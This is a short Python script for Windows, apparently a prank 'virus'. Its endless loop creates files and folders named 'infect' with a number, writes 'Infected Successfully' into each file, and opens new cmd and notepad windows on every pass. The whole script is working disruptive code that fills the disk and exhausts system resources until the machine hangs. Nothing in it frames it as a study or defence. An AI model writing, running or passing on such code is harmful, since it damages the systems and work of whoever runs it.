import os

#for windows

i = 1
while (i>0):

   #create infinite files
   file = open(f"infect{i}.txt", "w")
   file1 = open(f"infect{i}.docx", "w")
   file2 = open(f"infect{i}.py", "w")
   file3 = open(f"infect{i}.html", "w")
   file4 = open(f"infect{i}.xml", "w")
   file.write("Infected Successfully")
   file1.write("Infected Successfully")
   file2.write("Infected Successfully")
   file3.write("Infected Successfully")
   file4.write("Infected Successfully")
   file.close()
   file1.close()
   file2.close()
   file3.close()
   file4.close()
   try:
    #create infinite folders
    os.mkdir('infect{}'.format(str(i)))
    
   except:
       pass

   #open cmd infinite times
   os.system('start cmd')
   os.system('start notepad')
   i = i + 1
